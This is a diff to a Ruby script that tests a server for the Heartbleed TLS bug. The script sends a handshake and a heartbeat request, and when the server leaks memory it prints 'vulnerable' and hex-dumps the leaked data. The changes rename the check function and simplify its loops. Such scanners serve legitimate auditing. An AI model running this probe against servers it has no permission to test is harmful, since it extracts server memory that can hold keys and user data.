@@ -346,37 +346,34 @@ def read_tls_heartbeat_data (socket)
   return ht_data
 end
 
-def is_vulnerable?(host, port = 443)
+# Do the vulnerability test
+def check(host, port = 443)
+  # Connect
   s = TCPSocket.new(host, port)
 
   # Send ClientHello message
   s.write(TLS_HANDSHAKE)
 
   # Foolishly wait for ServerHelloDone message
-  while true
-    if (read_tls_header_type(s) == 22) and (read_tls_handshake_type(s) == 14)
-      break
-    end
-  end
+  loop until read_tls_header_type(s) == 22 and read_tls_handshake_type(s) == 14
 
   # Send Heartbeat Request message
   s.write(TLS_HEARTBEAT)
 
   # Read Heartbeat Response message if any
-  while true
-    if read_tls_header_type(s) == 24
-      data = read_tls_heartbeat_data(s)
-      if (not data.nil?) and (data.size > 3)
-        puts "Host #{host}:#{port} is vulnerable! Heartbeat response payload :"
-        puts Hexdump.dump(data)
-        break
-      end
+  if read_tls_header_type(s) == 24
+    data = read_tls_heartbeat_data(s)
+    if !data.nil? and data.size > 3
+      puts "Host #{host}:#{port} is vulnerable! Heartbeat response payload :"
+      puts Hexdump.dump(data)
     else
-      puts "Host #{host}:#{port} seems safe"
-      break
+      puts "Host #{host}:#{port} is safe"
     end
+  else
+    puts "Host #{host}:#{port} seems safe"
   end
 
+  # Disconnect
   s.close()
 end
 
@@ -386,7 +383,7 @@ end
 # ------------------------------------------------------------------------------
 
 if ARGV[1].nil?
-  is_vulnerable?(ARGV[0])
+  check(ARGV[0])
 else
-  is_vulnerable?(ARGV[0], ARGV[1])
+  check(ARGV[0], ARGV[1])
 end
